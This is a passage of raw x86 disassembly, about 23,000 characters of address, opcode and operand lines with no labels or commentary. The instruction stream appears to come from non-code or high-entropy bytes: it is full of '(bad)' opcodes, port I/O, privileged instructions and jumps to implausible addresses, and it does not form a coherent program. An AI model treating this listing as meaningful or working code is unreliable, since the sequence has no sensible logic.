  407378:	mov    al,0x1
  40737a:	inc    ecx
  40737b:	mov    dl,0x6
  40737d:	icebp  
  40737e:	fidivr WORD PTR [ecx+edx*1-0x64]
  407382:	out    0x40,eax
  407384:	cmp    edi,DWORD PTR [eax-0x45]
  407387:	gs adc al,0x1
  40738a:	imul   ecx,DWORD PTR [ebx-0x778828b],0x65b2e026
  407394:	xor    ecx,DWORD PTR [edi-0x66e05bf6]
  40739a:	dec    esp
  40739b:	js     0x40731f
  40739d:	(bad)  
  40739e:	in     eax,0x9c
  4073a0:	push   ss
  4073a1:	lods   eax,DWORD PTR ds:[si]
  4073a3:	aas    
  4073a4:	xor    al,0x7f
  4073a6:	idiv   ch
  4073a8:	imul   edi,edi,0x33
  4073ab:	rcl    BYTE PTR ds:[edx+0x26fe4cdf],0x7e
  4073b3:	retf   0x6ea2
  4073b6:	mov    ebx,0xd681a9f2
  4073bb:	fcomp  DWORD PTR [ecx+0x7c]
  4073be:	ficomp DWORD PTR [ebp+0x58]
  4073c1:	jno    0x4073a6
  4073c3:	fxch   st(2)
  4073c5:	xor    al,0xfd
  4073c7:	stos   DWORD PTR es:[edi],eax
  4073c8:	adc    BYTE PTR [ecx-0x8c92df3],ah
  4073ce:	cmp    edi,ebp
  4073d0:	stos   DWORD PTR es:[edi],eax
  4073d1:	mov    edx,0xf4d3501e
  4073d6:	pop    edx
  4073d7:	xor    eax,0x1e4890a
  4073dc:	mov    eax,ds:0x47251e7d
  4073e1:	cmp    eax,0x14702319
  4073e6:	mov    ah,BYTE PTR [edx+0x1bc556e4]
  4073ec:	leave  
  4073ed:	xchg   BYTE PTR [edi],cl
  4073ef:	cmp    edx,0x73
  4073f2:	leave  
  4073f3:	dec    esp
  4073f4:	shr    BYTE PTR [ebp+0x1b],1
  4073f7:	and    BYTE PTR [edx+0x5f],cl
  4073fa:	mov    bl,0x27
  4073fc:	mov    ah,0xc5
  4073fe:	outs   dx,BYTE PTR ds:[esi]
  4073ff:	rol    BYTE PTR [ecx+esi*4],0xc
  407403:	jecxz  0x407434
  407405:	or     esi,DWORD PTR ds:0xdf884957
  40740b:	sub    BYTE PTR ds:[esi+0x16],0xee
  407410:	and    DWORD PTR [edx],ebp
  407412:	and    al,0xc8
  407414:	loopne 0x407421
  407416:	sub    al,cl
  407418:	xchg   DWORD PTR [ecx+0x3de94c08],ebp
  40741e:	fcomp  DWORD PTR [edx-0x7bd5afeb]
  407425:	xor    eax,0x9d45c3f9
  40742a:	mov    eax,DWORD PTR [ebx]
  40742c:	imul   ecx,DWORD PTR [ebx-0x70bab342],0x16
  407433:	mov    bh,BYTE PTR [edi]
  407435:	dec    ebp
  407436:	retf   0x3008
  407439:	call   0x3a911e34
  40743e:	push   edx
  40743f:	test   DWORD PTR [ecx-0x6],ebx
  407442:	cmp    al,0xb6
  407444:	jecxz  0x40741b
  407446:	lods   al,BYTE PTR ds:[esi]
  407447:	(bad)  
  407448:	xchg   ebx,eax
  407449:	daa    
  40744a:	lods   al,BYTE PTR ds:[esi]
  40744b:	addr16 push ss
  40744d:	popf   
  40744e:	stc    
  40744f:	ficom  DWORD PTR [eax+0x3]
  407452:	js     0x407426
  407454:	cmp    al,0xce
  407456:	rcr    DWORD PTR [ebp-0x4b6d641a],1
  40745c:	add    al,0xc5
  40745e:	pop    ebp
  40745f:	mov    ss,WORD PTR [ecx]
  407461:	jmp    0x1d8c1e1e
  407466:	pop    edi
  407467:	push   esp
  407468:	bound  ebx,QWORD PTR [eax-0x5083f855]
  40746e:	shl    BYTE PTR [edi-0x5ade9cbd],cl
  407474:	or     ch,BYTE PTR [ebp-0x32bcd7b5]
  40747a:	jmp    0x23eb8a90
  40747f:	out    dx,al
  407480:	sbb    BYTE PTR [ebp-0x1d],cl
  407483:	ja     0x4074b0
  407485:	pop    es
  407486:	rcr    dl,1
  407488:	push   ecx
  407489:	sar    DWORD PTR [edi],cl
  40748b:	hlt    
  40748c:	add    ah,BYTE PTR [edi-0x6d]
  40748f:	add    DWORD PTR [edx+edi*4+0x35],ebx
  407493:	push   0x28
  407495:	imul   edx,DWORD PTR [eax-0x42],0x6e55f00
  40749c:	retf   
  40749d:	cmp    ch,BYTE PTR [edi-0x3cc5d20a]
  4074a3:	jae    0x4074ba
  4074a5:	inc    ebx
  4074a6:	pop    ebx
  4074a7:	dec    esp
  4074a8:	enter  0x1ce8,0xb2
  4074ac:	xor    al,0xb9
  4074ae:	mov    ch,0xa0
  4074b0:	adc    eax,DWORD PTR [esi+0x43893312]
  4074b6:	pusha  
  4074b7:	push   0x3d
  4074b9:	rol    BYTE PTR [ebx+0x1a],0x5e
  4074bd:	xor    ebx,edx
  4074bf:	sub    ah,BYTE PTR [edx+0x7f]
  4074c2:	into   
  4074c3:	jne    0x4074f8
  4074c5:	adc    al,0x58
  4074c7:	xchg   esi,eax
  4074c8:	sub    edx,esp
  4074ca:	add    eax,0xd677d54c
  4074cf:	dec    ebp
  4074d0:	and    eax,edi
  4074d2:	out    dx,eax
  4074d3:	sub    DWORD PTR [edx-0x57],esp
  4074d6:	pop    eax
  4074d7:	gs pushf 
  4074d9:	mov    dl,BYTE PTR [esi+0x3c]
  4074dc:	xchg   DWORD PTR [edx],ebp
  4074de:	enter  0x76fe,0x27
  4074e2:	sbb    al,0x11
  4074e4:	sub    ah,BYTE PTR [edi-0xc]
  4074e7:	sbb    dh,dh
  4074e9:	stos   DWORD PTR es:[edi],eax
  4074ea:	daa    
  4074eb:	scas   eax,DWORD PTR es:[edi]
  4074ec:	arpl   di,dx
  4074ee:	add    al,0xfe
  4074f0:	xchg   ebx,eax
  4074f1:	adc    DWORD PTR [edx],0xffffffd0
  4074f4:	shr    DWORD PTR [edx-0x1621d773],0x7a
  4074fb:	mov    esi,0xd27f3977
  407500:	xchg   ebx,eax
  407501:	retf   0x18a4
  407504:	popa   
  407505:	ficomp DWORD PTR [ecx-0x69]
  407509:	shr    DWORD PTR [ebx],1
  40750b:	(bad)  
  40750c:	rep outs dx,DWORD PTR ds:[esi]
  40750e:	outs   dx,DWORD PTR ds:[esi]
  40750f:	mov    dh,0xe2
  407511:	bound  esp,QWORD PTR [edx]
  407513:	pop    edi
  407514:	cmp    ecx,DWORD PTR ds:0x8fe47330
  40751a:	call   DWORD PTR [esi-0x264fa459]
  407520:	inc    ebx
  407521:	or     BYTE PTR ds:0xc0ffdacf,bh
  407527:	push   0xffffffad
  407529:	scas   eax,DWORD PTR es:[edi]
  40752a:	add    al,0xc2
  40752c:	outs   dx,BYTE PTR ds:[esi]
  40752d:	test   eax,0xcd8848a4
  407532:	imul   ebx,DWORD PTR [eax],0x2
  407535:	(bad)  [eax+0x2c6a1681]
  40753b:	inc    eax
  40753c:	push   ecx
  40753d:	xchg   edx,eax
  40753e:	ret    0x1d58
  407541:	push   edx
  407542:	xor    eax,0xad1938c1
  407547:	sbb    eax,ecx
  407549:	add    al,0x1a
  40754b:	cdq    
  40754c:	div    BYTE PTR [eax-0xc]
  40754f:	out    dx,al
  407550:	std    
  407551:	jge    0x4074d7
  407553:	push   eax
  407554:	sbb    al,0xcc
  407556:	cmc    
  407557:	popa   
  407558:	or     esi,DWORD PTR [ecx-0x19]
  40755b:	nop
  40755c:	and    al,0x3a
  40755e:	addr16 inc edx
  407560:	xor    esi,ebp
  407562:	mov    ds:0x6abefbf0,eax
  407567:	pop    ebx
  407568:	cli    
  407569:	inc    eax
  40756a:	push   ss
  40756b:	aaa    
  40756c:	popa   
  40756d:	mov    esi,0x9868cd0e
  407572:	outs   dx,DWORD PTR ds:[esi]
  407573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407574:	xchg   BYTE PTR ds:[ebp-0x5d],ah
  407578:	(bad)  [ecx+0x6]
  40757b:	inc    edi
  40757c:	xchg   ebp,eax
  40757d:	cs je  0x40752e
  407580:	cmp    al,0x4a
  407582:	mov    dl,0x14
  407584:	stos   DWORD PTR es:[edi],eax
  407585:	(bad)
  407589:	add    eax,0xe17f2212
  40758e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40758f:	lock rcr esp,cl
  407592:	push   ecx
  407593:	lods   al,BYTE PTR ds:[esi]
  407594:	shl    DWORD PTR [ebx],cl
  407596:	hlt    
  407597:	ss and cl,al
  40759a:	inc    esp
  40759b:	jmp    0x407555
  40759d:	aaa    
  40759e:	bound  ecx,QWORD PTR [ecx+0xa051947]
  4075a4:	or     al,0x14
  4075a6:	mov    edx,0x18935897
  4075ab:	iret   
  4075ac:	sub    DWORD PTR [ecx-0x37a24547],0x4ccfbac0
  4075b6:	mov    cl,0xd5
  4075b8:	clc    
  4075b9:	sub    dh,dh
  4075bb:	mov    ebx,0xe1a69223
  4075c0:	cmc    
  4075c1:	pop    esp
  4075c2:	push   esi
  4075c3:	pusha  
  4075c4:	cli    
  4075c5:	scas   al,BYTE PTR es:[edi]
  4075c6:	shl    edi,1
  4075c8:	pop    esi
  4075c9:	jge    0x40759d
  4075cb:	lds    ebp,FWORD PTR [ecx+0x4651ece0]
  4075d1:	xchg   edi,eax
  4075d2:	mov    eax,0xcd84e34c
  4075d7:	ret    
  4075d8:	cmp    dl,al
  4075da:	fisttp DWORD PTR [eax]
  4075dc:	xchg   edi,eax
  4075dd:	es out 0x43,al
  4075e0:	arpl   WORD PTR [eax-0x7c9553d2],bp
  4075e6:	jle    0x407586
  4075e8:	mov    dh,0x72
  4075ea:	pop    edx
  4075eb:	sbb    ah,ch
  4075ed:	(bad)
  4075f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075f2:	in     eax,0x89
  4075f4:	in     al,0x34
  4075f6:	mov    ebp,0x9d8c05c0
  4075fb:	sub    ebp,ecx
  4075fd:	(bad)  
  4075fe:	mov    esp,0xa19486bc
  407603:	adc    al,0x69
  407605:	clc    
  407606:	adc    eax,esi
  407608:	mov    ebx,0x7620d5ec
  40760d:	js     0x4075de
  40760f:	mov    ds:0xce514b1e,al
  407614:	iret   
  407615:	xor    ebp,ecx
  407617:	push   ebx
  407618:	(bad)  
  407619:	fsub   QWORD PTR [eax]
  40761b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40761c:	icebp  
  40761d:	aam    0x31
  40761f:	(bad)  
  407620:	repnz les esi,FWORD PTR [ebx+0x7f7d9d64]
  407627:	pop    ds
  407628:	loope  0x4075de
  40762a:	into   
  40762b:	jmp    DWORD PTR [ebx]
  40762d:	add    DWORD PTR [esi+0x6e],esp
  407630:	sub    BYTE PTR [eax+ebp*2+0x59],cl
  407634:	fwait
  407635:	push   0x24
  407637:	mov    ah,BYTE PTR [ebx]
  407639:	mov    edx,ebp
  40763b:	daa    
  40763c:	daa    
  40763d:	cs lock push ebx
  407640:	js     0x4075d8
  407642:	dec    ebp
  407643:	popf   
  407644:	cld    
  407645:	inc    ecx
  407646:	jae    0x407619
  407648:	sbb    ah,bh
  40764a:	jg     0x40765f
  40764c:	adc    bl,bh
  40764e:	xlat   BYTE PTR ds:[ebx]
  40764f:	or     al,0x14
  407651:	test   bl,ch
  407653:	adc    DWORD PTR [ecx-0x53],0xfffffff2
  407657:	jg     0x407656
  407659:	mov    bh,0xc7
  40765b:	xchg   ebp,eax
  40765c:	(bad)  
  40765d:	retf   0x858c
  407660:	inc    esi
  407661:	adc    BYTE PTR [ebp-0x6518c909],bl
  407667:	inc    edx
  407668:	xchg   esi,eax
  407669:	data16 int 0x93
  40766c:	ins    DWORD PTR es:[edi],dx
  40766d:	push   ecx
  40766e:	les    ecx,FWORD PTR ss:[eax+0x5]
  407672:	jne    0x4076a8
  407674:	add    DWORD PTR [edi],edx
  407676:	pop    esi
  407677:	test   BYTE PTR [esi+esi*8+0x17ca5c37],dl
  40767e:	jecxz  0x4076c1
  407680:	cmp    BYTE PTR [esi-0x5cbd6ec],dl
  407686:	(bad)  
  407687:	adc    DWORD PTR ds:[ecx],edi
  40768a:	xlat   BYTE PTR ds:[ebx]
  40768b:	push   ss
  40768c:	jl     0x407629
  40768e:	dec    eax
  40768f:	sbb    BYTE PTR [ebx],ah
  407691:	xor    dl,BYTE PTR [eax]
  407693:	xor    DWORD PTR [esi],esi
  407695:	clc    
  407696:	mov    dl,0xd5
  407698:	sar    DWORD PTR [edx-0x8f7d86f],0x99
  40769f:	push   eax
  4076a0:	retf   0xfa8d
  4076a3:	mov    ds:0x632958fe,al
  4076a8:	sub    ecx,DWORD PTR [ebx]
  4076aa:	(bad)  
  4076ab:	rol    BYTE PTR [esi-0x14],0x88
  4076af:	add    eax,0x629877e4
  4076b5:	fldenv [esi+0x9]
  4076b8:	lea    ebp,[ecx-0x39]
  4076bb:	mov    ds:0xff7a2aeb,eax
  4076c0:	std    
  4076c1:	push   0x36
  4076c3:	(bad)  
  4076c5:	pop    esp
  4076c6:	sub    dl,BYTE PTR [ecx-0x3e7825a5]
  4076cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076cd:	sysexit 
  4076cf:	sub    al,0xba
  4076d1:	ja     0x4076b4
  4076d3:	imul   ebx,DWORD PTR [ebp+0x4d],0x20
  4076d7:	loope  0x407757
  4076d9:	jns    0x4076e3
  4076db:	and    al,0x5
  4076dd:	push   ss
  4076de:	icebp  
  4076df:	lods   eax,DWORD PTR ds:[esi]
  4076e0:	ss loopne 0x4076b0
  4076e3:	adc    DWORD PTR ds:0xfd92d478,edi
  4076e9:	bound  edi,QWORD PTR [ebx-0x73fc0a8a]
  4076ef:	xchg   ebp,eax
  4076f0:	outs   dx,BYTE PTR ds:[esi]
  4076f1:	shr    BYTE PTR ds:0x86af3bde,1
  4076f7:	pop    esp
  4076f8:	retf   0x5737
  4076fb:	add    DWORD PTR ds:0x384997bb,edx
  407701:	scas   eax,DWORD PTR es:[edi]
  407702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407703:	aaa    
  407704:	mov    al,0xcf
  407706:	pusha  
  407707:	js     0x40770f
  407709:	into   
  40770a:	xchg   edx,eax
  40770b:	ja     0x407737
  40770d:	pop    ss
  40770e:	out    dx,al
  40770f:	jle    0x40776f
  407711:	pop    esp
  407712:	mov    ebx,0x22ccc7d8
  407717:	data16 mov bl,ah
  40771a:	imul   esi,DWORD PTR [edx+0x66],0xc24fddad
  407721:	test   BYTE PTR [ecx+eax*2+0x73f597ce],0x2e
  407729:	jg     0x40770b
  40772b:	sar    BYTE PTR [ecx+0x6338af08],0x95
  407732:	test   DWORD PTR [esi],0xc5dd37ae
  407738:	loope  0x40777f
  40773a:	test   al,0x3a
  40773c:	and    edi,DWORD PTR [esi-0x70748059]
  407742:	xchg   ebp,eax
  407743:	mov    ds:0xe9cf683e,al
  407748:	xor    DWORD PTR [ecx+edi*2+0x4e9fd0fc],esi
  40774f:	push   edi
  407750:	or     esp,DWORD PTR [edi-0x78]
  407753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407754:	dec    edx
  407755:	bound  esi,QWORD PTR [esp+ebp*1]
  407758:	stc    
  407759:	std    
  40775a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40775b:	sub    edi,DWORD PTR [eax+0x30bab97d]
  407761:	shl    BYTE PTR [edx+0x68c8816f],cl
  407767:	loope  0x407715
  407769:	int3   
  40776a:	mov    edi,esi
  40776c:	cmp    eax,0x3455b45c
  407771:	add    WORD PTR [ebx-0x6ffa7b9d],sp
  407778:	bound  ecx,QWORD PTR [edi]
  40777a:	fnstcw WORD PTR [ecx+0x6c]
  40777d:	mov    edx,esi
  40777f:	cmp    edx,DWORD PTR [edx]
  407781:	into   
  407782:	or     bh,BYTE PTR ds:0x60ba9f14
  407788:	pop    esp
  407789:	sar    DWORD PTR gs:[edx],cl
  40778c:	and    esp,DWORD PTR [ecx-0x672cc4ba]
  407792:	setno  al
  407795:	das    
  407796:	mov    dh,0xd9
  407798:	push   edx
  407799:	ret    
  40779a:	cmp    esi,0x1ee49fa4
  4077a0:	jo     0x4077ec
  4077a2:	pop    ebp
  4077a3:	add    dh,BYTE PTR [esi-0x45]
  4077a6:	or     ch,al
  4077a8:	dec    ecx
  4077a9:	pusha  
  4077aa:	xlat   BYTE PTR ds:[ebx]
  4077ab:	cwde   
  4077ac:	pop    es
  4077ad:	xor    al,0xaa
  4077af:	ins    BYTE PTR es:[edi],dx
  4077b0:	mov    es,WORD PTR [eax]
  4077b2:	xchg   edi,eax
  4077b3:	dec    ebx
  4077b4:	push   0x4d
  4077b6:	jb     0x40775d
  4077b8:	and    ah,BYTE PTR [edx+ebp*2]
  4077bb:	and    al,BYTE PTR [ebx+eiz*2]
  4077be:	(bad)  
  4077bf:	inc    BYTE PTR [ebx+0x11]
  4077c2:	mov    edi,0x3e12e240
  4077c7:	xchg   ebp,eax
  4077c8:	sti    
  4077c9:	add    BYTE PTR [esi+0x78],0x6b
  4077cd:	jl     0x407788
  4077cf:	sub    DWORD PTR [ecx+0x3],edx
  4077d2:	nop
  4077d3:	daa    
  4077d4:	fdiv   QWORD PTR [ebx]
  4077d6:	and    al,ah
  4077d8:	cmp    DWORD PTR [ebx],edx
  4077da:	jmp    0x1c5ac0c7
  4077df:	pop    esp
  4077e0:	js     0x4077d5
  4077e2:	mov    al,ds:0x3f287680
  4077e7:	lea    esi,[ebx]
  4077e9:	std    
  4077ea:	mov    bl,0x28
  4077ec:	fs jle 0x407868
  4077ef:	xor    eax,0x9e69361e
  4077f4:	adc    BYTE PTR [ecx-0x2f],0x12
  4077f8:	jae    0x4077d4
  4077fa:	inc    esi
  4077fb:	or     dl,bh
  4077fd:	fs pop ecx
  4077ff:	je     0x407860
  407801:	mov    edx,0xf045c52
  407806:	gs sbb al,0xef
  407809:	std    
  40780a:	or     DWORD PTR [eax+0x2fe647d],esp
  407810:	jl     0x40782f
  407812:	test   dh,bl
  407814:	xor    DWORD PTR [ecx],ecx
  407816:	dec    ebx
  407817:	sbb    al,0xd6
  407819:	jg     0x40788e
  40781b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40781c:	pop    DWORD PTR [edi]
  40781e:	lods   al,BYTE PTR ds:[esi]
  40781f:	adc    al,0xe8
  407821:	sub    ch,al
  407823:	xchg   esp,eax
  407824:	dec    edi
  407825:	data16 or BYTE PTR gs:[ecx],cl
  407829:	pop    es
  40782a:	push   cs
  40782b:	or     edx,edi
  40782d:	nop
  40782e:	sbb    al,0x41
  407830:	sub    eax,0xbf837d3a
  407835:	xor    eax,0x58c69c1a
  40783a:	pop    esp
  40783b:	inc    ebx
  40783c:	inc    ecx
  40783d:	sbb    bh,BYTE PTR [edx]
  40783f:	jae    0x407859
  407841:	cmp    al,0x33
  407843:	add    al,0x2a
  407846:	cmp    eax,0x11fe8807
  40784b:	jnp    0x407816
  40784d:	sar    DWORD PTR [esp+ebp*4],cl
  407850:	pop    ebp
  407851:	or     eax,0x759040ad
  407856:	and    ecx,0x5a
  407859:	adc    edi,ebp
  40785b:	in     eax,0x46
  40785d:	or     BYTE PTR [edx+0x522a688a],0xe7
  407864:	add    DWORD PTR [ebx+0x21],0x21
  407868:	mov    dl,BYTE PTR [edx-0x59b57832]
  40786e:	loopne 0x40785e
  407870:	(bad)  
  407872:	lods   al,BYTE PTR ds:[esi]
  407873:	int3   
  407874:	jne    0x407847
  407876:	nop
  407877:	hlt    
  407878:	leave  
  407879:	in     eax,0x50
  40787b:	xchg   esp,eax
  40787c:	sbb    ebx,DWORD PTR [esi+ecx*8-0x533aa78]
  407883:	sbb    eax,0xbad3f0c4
  407888:	mov    ds:0xf18db97c,eax
  40788d:	retf   0xb1d9
  407890:	inc    ecx
  407891:	push   esi
  407892:	out    0x29,eax
  407894:	fwait
  407895:	(bad)  
  407896:	xchg   esi,eax
  407897:	adc    ah,BYTE PTR [ebx-0x48fb7b64]
  40789d:	sbb    bl,BYTE PTR [esi+0x1b]
  4078a0:	aam    0x72
  4078a2:	mov    ebp,0x1e9e0536
  4078a7:	iret   
  4078a8:	cmp    BYTE PTR [esi-0x270682e3],ah
  4078ae:	outs   dx,DWORD PTR ds:[esi]
  4078af:	sbb    al,0xd1
  4078b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078b2:	xlat   BYTE PTR ds:[ebx]
  4078b3:	adc    al,0x4d
  4078b5:	iret   
  4078b6:	pushf  
  4078b7:	jnp    0x4078b5
  4078b9:	mov    al,0x4c
  4078bb:	cmp    al,0x15
  4078be:	data16 jl 0x4078a5
  4078c1:	inc    ebp
  4078c2:	fs jp  0x407852
  4078c5:	mov    ebp,0x96852a52
  4078ca:	cmp    ebx,ebp
  4078cc:	jmp    0xfa18:0x3bd54c83
  4078d3:	mov    edx,0xf1e1b1d8
  4078d8:	div    DWORD PTR [esi-0x32]
  4078db:	inc    ebp
  4078dc:	and    BYTE PTR [ecx],al
  4078de:	push   edi
  4078df:	cdq    
  4078e0:	imul   esp,esp,0xffffff82
  4078e3:	(bad)  
  4078e4:	jmp    0xb5c4e958
  4078e9:	mov    esi,0x4b4e9761
  4078ee:	imul   eax,DWORD PTR [ebx+eax*1],0x542c9b84
  4078f5:	(bad)  [edx]
  4078f7:	mov    ch,bh
  4078f9:	dec    esp
  4078fa:	ins    BYTE PTR es:[edi],dx
  4078fb:	outs   dx,DWORD PTR ds:[esi]
  4078fc:	(bad)  [eax]
  4078fe:	pop    ss
  4078ff:	shr    DWORD PTR [ebp-0x80],1
  407902:	cld    
  407903:	scas   al,BYTE PTR es:[edi]
  407904:	nop
  407905:	xchg   ecx,eax
  407906:	and    DWORD PTR [ebx-0x45e9e43d],edi
  40790c:	stos   BYTE PTR es:[edi],al
  40790d:	fwait
  40790e:	and    ebx,DWORD PTR [esi-0x51a62286]
  407914:	aam    0xe3
  407916:	ficom  DWORD PTR [ecx+0x3d]
  407919:	scas   eax,DWORD PTR es:[edi]
  40791a:	push   eax
  40791b:	mov    ds:0xfef9bbb5,eax
  407920:	or     bl,BYTE PTR [edx-0x5c5bb05]
  407926:	push   es
  407927:	xor    ch,bh
  407929:	test   eax,0xd3da6fdc
  40792e:	test   BYTE PTR [ecx+0x1eadbf7],bl
  407934:	mov    ebp,ecx
  407936:	outs   dx,BYTE PTR ds:[esi]
  407937:	imul   BYTE PTR [esi-0x7feb5755]
  40793d:	pop    ebx
  40793e:	fdecstp 
  407940:	adc    dl,BYTE PTR [edi]
  407942:	mov    ebx,es
  407944:	fdivr  DWORD PTR [ecx-0x6d6be2ef]
  40794a:	dec    ebp
  40794b:	push   ebp
  40794c:	stc    
  40794d:	lods   eax,DWORD PTR ds:[esi]
  40794e:	pop    ecx
  40794f:	dec    esp
  407950:	inc    esi
  407951:	dec    edx
  407952:	sbb    edx,DWORD PTR [ebx]
  407954:	in     eax,0x91
  407956:	mov    bh,0x5a
  407958:	mov    ebp,0xb47fb763
  40795d:	dec    ebp
  40795e:	xchg   esp,eax
  40795f:	dec    ebp
  407960:	push   esp
  407961:	fadd   QWORD PTR [edi]
  407963:	pop    esp
  407964:	in     al,dx
  407965:	loope  0x4079ba
  407967:	div    edx
  407969:	dec    ebp
  40796a:	aas    
  40796b:	pop    ecx
  40796c:	push   0xd
  40796e:	nop
  40796f:	loope  0x4079eb
  407971:	push   ebp
  407972:	xchg   BYTE PTR [eax],bl
  407974:	mov    BYTE PTR [edi-0x177d3b1d],dl
  40797a:	nop
  40797b:	jp     0x4079ac
  40797d:	push   ebx
  40797e:	dec    ebp
  40797f:	addr16 xchg esp,eax
  407981:	dec    ecx
  407982:	fmul   QWORD PTR [edx+0x6ae03189]
  407988:	repnz push esp
  40798a:	ret    
  40798b:	dec    ebp
  40798c:	pop    esp
  40798d:	and    DWORD PTR [ebp-0x49],0x6c
  407991:	lock fild QWORD PTR [eax-0x4ae33551]
  407998:	jnp    0x40792e
  40799a:	test   dl,bl
  40799c:	mov    al,ds:0x2ff379bb
  4079a1:	(bad)  
  4079a2:	call   0x6325d1e6
  4079a7:	jne    0x40798b
  4079a9:	leave  
  4079aa:	push   eax
  4079ab:	jp     0x407960
  4079ad:	jns    0x407a13
  4079af:	jbe    0x407953
  4079b1:	push   ecx
  4079b2:	add    dh,BYTE PTR [esp+ebx*4]
  4079b5:	(bad)  
  4079b6:	sbb    edi,edx
  4079b8:	sbb    BYTE PTR [ebx-0x1422ac3c],bl
  4079be:	push   ds
  4079bf:	popf   
  4079c0:	dec    ebp
  4079c1:	xchg   esi,eax
  4079c2:	or     eax,esi
  4079c4:	call   0x901f98e1
  4079c9:	and    BYTE PTR [esp+ecx*2-0x31],ah
  4079cd:	and    edi,0xdad15dc1
  4079d3:	int3   
  4079d4:	sbb    DWORD PTR ds:0xfab1db91,esp
  4079da:	pop    edx
  4079db:	ret    0xd854
  4079de:	lds    ecx,FWORD PTR [ebp-0x5db4ca28]
  4079e4:	sbb    bl,BYTE PTR [eax]
  4079e6:	mov    al,ds:0xfd634e7f
  4079eb:	fs dec esi
  4079ed:	or     cl,BYTE PTR [ecx+edi*4]
  4079f0:	outs   dx,BYTE PTR ds:[esi]
  4079f1:	cmc    
  4079f2:	int    0xa8
  4079f4:	std    
  4079f5:	lea    ebp,[ebx]
  4079f7:	sub    al,0x10
  4079f9:	adc    esi,DWORD PTR [ecx+ebp*8-0x25]
  4079fd:	icebp  
  4079fe:	nop
  4079ff:	inc    ebp
  407a00:	retf   0xc41b
  407a03:	cmp    BYTE PTR [edi],ah
  407a05:	cmc    
  407a06:	shr    DWORD PTR [esi],1
  407a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a09:	shr    DWORD PTR [esi],cl
  407a0b:	and    eax,0x14ad50cd
  407a10:	(bad)  
  407a11:	ins    DWORD PTR es:[edi],dx
  407a12:	jge    0x407a8d
  407a14:	jmp    0x943327d0
  407a19:	test   al,0x2c
  407a1b:	arpl   WORD PTR [eax],di
  407a1d:	and    BYTE PTR [ecx+0x2a],bl
  407a20:	mov    esi,0x59962f3f
  407a25:	fnstsw WORD PTR ds:0xc0a77be6
  407a2b:	mov    ch,0x16
  407a2d:	jl     0x407a19
  407a2f:	(bad)  
  407a30:	loopne 0x407a54
  407a32:	adc    eax,DWORD PTR [ebp-0x5e]
  407a35:	popf   
  407a36:	loop   0x407a3a
  407a38:	scas   eax,DWORD PTR es:[edi]
  407a39:	and    DWORD PTR [ecx+0x6055438f],0x4bab3106
  407a43:	or     cl,BYTE PTR [eax+0x10]
  407a46:	in     eax,0x73
  407a48:	std    
  407a49:	sbb    eax,edi
  407a4b:	test   eax,0xb229a449
  407a50:	imul   ebx,DWORD PTR [edx+0x71],0x11c66b40
  407a57:	cs inc ebx
  407a59:	daa    
  407a5a:	sub    ecx,ebx
  407a5c:	cld    
  407a5d:	pop    eax
  407a5e:	mov    eax,ds:0x75b9ab06
  407a63:	aaa    
  407a64:	sti    
  407a65:	pushf  
  407a66:	fs push 0xffffff9b
  407a69:	mov    al,0x7d
  407a6b:	and    BYTE PTR [eax-0x85fef2f],al
  407a71:	push   0x31d71d1f
  407a76:	inc    edx
  407a77:	cmc    
  407a78:	mov    edi,0x4ce391e4
  407a7d:	add    eax,0x6a9186a2
  407a82:	push   es
  407a83:	mov    ch,BYTE PTR [esi-0x428b1009]
  407a89:	jge    0x407aa1
  407a8b:	xor    DWORD PTR [esi+0x4f66aa6d],ecx
  407a91:	loopne 0x407a3e
  407a93:	fadd   DWORD PTR [ebx-0x14]
  407a96:	push   cs
  407a97:	hlt    
  407a98:	pop    ss
  407a99:	fidivr WORD PTR [ecx+0x47a6a531]
  407a9f:	mov    ebx,0xa56e267c
  407aa4:	in     al,0x7b
  407aa6:	gs adc al,0x40
  407aa9:	les    ecx,FWORD PTR [ecx+eax*1-0x517b0045]
  407ab0:	cs jo  0x407a5e
  407ab3:	cmp    eax,0x9335da49
  407ab8:	sbb    DWORD PTR [edx],edx
  407aba:	ins    BYTE PTR es:[edi],dx
  407abb:	jle    0x407a78
  407abd:	out    0x5b,al
  407abf:	shr    DWORD PTR [edx-0x45171768],0x69
  407ac6:	jo     0x407a76
  407ac8:	jg     0x407b2c
  407aca:	adc    al,0xb1
  407acc:	bound  eax,QWORD PTR [esi+0x4a51784b]
  407ad2:	scas   eax,DWORD PTR es:[edi]
  407ad3:	mov    dh,0x26
  407ad5:	jg     0x407a92
  407ad7:	mov    dh,0x42
  407ad9:	pop    esi
  407ada:	add    al,0x1e
  407adc:	jg     0x407b50
  407ade:	push   edi
  407adf:	push   es
  407ae0:	loope  0x407b16
  407ae2:	push   ebp
  407ae3:	dec    eax
  407ae4:	xor    bh,al
  407ae6:	ins    BYTE PTR es:[edi],dx
  407ae7:	sbb    BYTE PTR [eax-0x57563a44],al
  407aed:	xchg   esp,eax
  407aee:	stc    
  407aef:	push   ebx
  407af0:	xchg   ecx,eax
  407af1:	cmp    al,0x1
  407af3:	or     eax,0x5f9b5a48
  407af8:	fwait
  407af9:	les    eax,FWORD PTR [esi]
  407afb:	in     eax,dx
  407afc:	mov    BYTE PTR [edi+0x3c],cl
  407aff:	and    bl,BYTE PTR [ebp-0x1d]
  407b02:	aaa    
  407b03:	sub    BYTE PTR ds:0x1eb68574,bl
  407b09:	xor    eax,0xca5c0dbb
  407b0e:	retf   
  407b0f:	xchg   ecx,eax
  407b10:	stc    
  407b11:	aas    
  407b12:	cld    
  407b13:	jb     0x407b69
  407b15:	fcomp  QWORD PTR [ebx-0x1881290a]
  407b1b:	mov    bh,0xec
  407b1d:	inc    ebx
  407b1e:	scas   al,BYTE PTR es:[edi]
  407b1f:	aad    0x47
  407b21:	mov    esp,0xaf36f898
  407b26:	pop    edx
  407b27:	hlt    
  407b28:	clc    
  407b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2a:	add    BYTE PTR [edi+0xb],bh
